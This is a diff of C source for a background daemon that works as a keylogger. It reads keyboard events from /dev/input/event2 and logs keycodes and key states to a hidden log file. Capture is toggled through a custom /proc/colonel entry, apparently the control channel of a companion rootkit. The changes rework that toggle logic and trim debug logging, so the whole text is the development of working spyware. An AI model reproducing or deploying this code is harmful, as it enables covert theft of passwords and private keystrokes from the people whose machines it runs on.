@@ -48,7 +48,7 @@ int main(void) {
 		exit(1);
 	}
 
-	// chdir("/opt/");					/* change daemon working directory */
+	// chdir("/opt/");				/* change daemon working directory */
 
 	close(STDIN_FILENO);
 	close(STDOUT_FILENO);
@@ -59,7 +59,6 @@ int main(void) {
 	fp = fopen("./log/log.txt", "a+"); 			/* daemon log */
 	evlog = fopen("./log/evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
-	// ftty = open("/proc/colonel", O_RDONLY);		/* will act as pseudo terminal */
 	
 	time_t curtime;
 	time(&curtime);
@@ -88,33 +87,29 @@ int main(void) {
 			unameData.machine);
 	fflush(evlog);
 
-	/* grabs keyboard input -- ev.code = keycode, ev.value = key state (0: up, 1: down)*/
-	while(1) {
+	while(1) {				
 		fflush(fp);
-		read(fd, &ev, sizeof(struct input_event));		/* read from /dev/input/eventX */
-		ftty = open("/proc/colonel", O_RDONLY);			/* read from /proc/colonel */
-		if (0 == listening) {
-			read(ftty, cmd, sizeof(cmd));				/* read from /proc/colonel */
-			toggle = strstr(cmd, kl);					/* looks for change in /proc/colonel */
-			fprintf(fp, "KEYTOGGLE: %s\n", toggle);
-			if (toggle != NULL) {
-				fprintf(fp, "In strncmp if listening: %d, cmd: %c\n", listening, cmd[strlen(cmd)-5]);
-				listening = !listening;
-				fprintf(fp, "listening: %d -- %s", listening, ctime(&curtime));
-				close(ftty);
-				continue;
-			}
+		read(fd, &ev, sizeof(struct input_event));			/* read from /dev/input/eventX */
+		ftty = open("/proc/colonel", O_RDONLY);				/* read from /proc/colonel */
+		read(ftty, cmd, sizeof(cmd));						/* read from /proc/colonel */
+		toggle = strstr(cmd, kl);							/* looks for change in /proc/colonel */
 
-		} else if ((1 == ev.type) && (1 == listening)) {
-			fprintf(evlog, "%i,%i-", ev.code, ev.value);
+		if ((0 == listening) && (toggle != NULL)) {
+			listening = !listening;
+			fprintf(fp, "Begin listening -- %s", ctime(&curtime));
+			close(ftty);
+			continue;
+
+		} else if ((1 == ev.type) && (1 == listening)) {	/* if typing (ev.type = 1) and keylogger is on */
+			fprintf(evlog, "%i,%i-", ev.code, ev.value);	/* grabs keyboard input -- 
+															 * ev.code = keycode
+															 * ev.value = key state (0: key up, 1: key down) */
 			fflush(evlog);
 
-			fprintf(fp, "In 2nd if statement listening: %d\n", listening);
 			ftty = open("/proc/colonel", O_RDONLY | O_NONBLOCK);
-			read(ftty, cmd, sizeof(cmd));
-			toggle = strstr(cmd, kl);
 			if (NULL == toggle) {
 				listening = !listening;
+				fprintf(fp, "End listening -- %s", ctime(&curtime));
 				close(ftty);
 				continue;
 			}
